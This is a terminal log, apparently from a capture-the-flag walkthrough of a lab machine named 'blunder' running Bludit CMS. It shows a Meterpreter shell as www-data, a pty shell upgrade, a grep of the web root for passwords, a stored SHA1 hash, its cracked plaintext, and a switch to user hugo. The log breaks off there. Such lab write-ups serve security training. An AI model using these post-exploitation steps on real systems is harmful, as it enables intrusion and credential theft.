meterpreter > sysinfo
Computer    : blunder
OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > shell
Process 7316 created.
Channel 0 created.
pwd
/var/www/bludit-3.9.2/bl-content/tmp
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /var/www
cd /var/www
www-data@blunder:/var/www$ export TERM=xterm
export TERM=xterm
www-data@blunder:/var/www$ ls
ls
bludit-3.10.0a  bludit-3.9.2  html
www-data@blunder:/var/www$ cd bludit-3.10.0a
cd bludit-3.10.0a
www-data@blunder:/var/www/bludit-3.10.0a$ grep -R password | grep -v .js
grep -R password | grep -v .js
install.php:    $passwordHash = sha1($adminPassword.$salt);
install.php:                    'password'=>$passwordHash,
install.php:    if (Text::length($_POST['password'])<6) {
install.php:            $errorText = $L->g('password-must-be-at-least-6-characters-long');
install.php:            install($_POST['password'], $_POST['timezone']);
install.php:                            <p><?php echo $L->get('choose-a-password-for-the-user-admin') ?></p>
install.php:    // Show password
install.php:                    input.setAttribute("type", "password");
bl-kernel/admin/controllers/user-password.php:$layout['title'] = $L->g('Change password').' - '.$layout['title'];
bl-kernel/admin/controllers/login.php:  if ($login->verifyUser($_POST['username'], $_POST['password'])) {
bl-kernel/admin/controllers/login.php:  Alert::set($L->g('Username or password incorrect'), ALERT_STATUS_FAIL);
bl-kernel/admin/views/user-password.php:        <?php echo Bootstrap::pageTitle(array('title'=>$L->g('Change password'), 'icon'=>'user')); ?>
bl-kernel/admin/views/user-password.php:        // New password
bl-kernel/admin/views/user-password.php:                'label'=>$L->g('New password'),
bl-kernel/admin/views/user-password.php:                'type'=>'password',
bl-kernel/admin/views/user-password.php:        // Confirm password
bl-kernel/admin/views/user-password.php:                'label'=>$L->g('Confirm new password'),
bl-kernel/admin/views/user-password.php:                'type'=>'password',
bl-kernel/admin/views/new-user.php:             'name'=>'new_password',
bl-kernel/admin/views/new-user.php:             'type'=>'password',
bl-kernel/admin/views/new-user.php:             'name'=>'confirm_password',
bl-kernel/admin/views/new-user.php:             'type'=>'password',
bl-kernel/admin/views/edit-user.php:                    <a href="'.HTML_PATH_ADMIN_ROOT.'user-password/'.$user->username().'" class="btn btn-primary mr-2">'.$L->g('Change password').'</a>
bl-kernel/admin/views/edit-user.php:                    'tip'=>$L->g('this-token-is-similar-to-a-password-it-should-not-be-shared')
bl-kernel/admin/views/edit-user.php:                            'tip'=>$user->enabled()?'':$L->g('To enable the user you must set a new password')
bl-kernel/login.class.php:      // Check if the username and the password are valid
bl-kernel/login.class.php:      // Returns FALSE for invalid username or password
bl-kernel/login.class.php:      public function verifyUser($username, $password)
bl-kernel/login.class.php:              if (empty($username) || empty($password)) {
bl-kernel/login.class.php:                      Log::set(__METHOD__.LOG_SEP.'Username or password empty. Username: '.$username);
bl-kernel/login.class.php:              if (Text::length($password)<PASSWORD_LENGTH) {
bl-kernel/login.class.php:              $passwordHash = $this->users->generatePasswordHash($password, $user->salt());
bl-kernel/login.class.php:              if ($passwordHash===$user->password()) {
bl-kernel/login.class.php:                      Log::set(__METHOD__.LOG_SEP.'User logged succeeded by username and password - Username ['.$username.']');
bl-kernel/user.class.php:       public function password()
bl-kernel/user.class.php:               return $this->getValue('password');
bl-kernel/user.class.php:               $password = $this->getValue('password');
bl-kernel/user.class.php:               return $password != '!';
bl-kernel/users.class.php:              'password'=>'',
bl-kernel/users.class.php:              $this->db[$username]['password'] = '!';
bl-kernel/users.class.php:              // The password is hashed, the password doesn't need to be sanitize in the next step
bl-kernel/users.class.php:              $password = $args['password'];
bl-kernel/users.class.php:              $row['password'] = $this->generatePasswordHash($password, $row['salt']);
bl-kernel/users.class.php:                      if ($field!=='password') {
bl-kernel/users.class.php:              // Set a new password
bl-kernel/users.class.php:              if (!empty($args['password'])) {
bl-kernel/users.class.php:                      $row['password'] = $this->generatePasswordHash($args['password'], $row['salt']);
bl-kernel/users.class.php:      public function generatePasswordHash($password, $salt)
bl-kernel/users.class.php:              return sha1($password.$salt);
bl-kernel/users.class.php:      // Change user password
bl-kernel/users.class.php:      // args => array( username, password )
bl-kernel/functions.php:        if (Text::length($args['new_password']) < PASSWORD_LENGTH) {
bl-kernel/functions.php:        // Check new password and confirm password are equal
bl-kernel/functions.php:        if ($args['new_password'] != $args['confirm_password']) {
bl-kernel/functions.php:                Alert::set($L->g('The password and confirmation password do not match'), ALERT_STATUS_FAIL);
bl-kernel/functions.php:        $tmp['password'] = $args['new_password'];
bl-kernel/functions.php:                Alert::set($L->g('The password and confirmation password do not match'), ALERT_STATUS_FAIL);
bl-kernel/functions.php:        if ($users->setPassword(array('username'=>$username, 'password'=>$newPassword))) {
bl-kernel/functions.php:                        'dictionaryKey'=>'user-password-changed',
bl-content/databases/users.php:        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
.
.
.
// Ok so we see "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"
// Go to any online hashcracker to find that the password is 'Password120'
www-data@blunder:/var/www/bludit-3.10.0a$ cd /home
cd /home
www-data@blunder:/home$ ls
ls
hugo  shaun
www-data@blunder:/home$ su hugo
su hugo
Password: Password120

hugo@blunder:/home$ 
.
.
.
// Continued in asHugo.bash
.
.
.
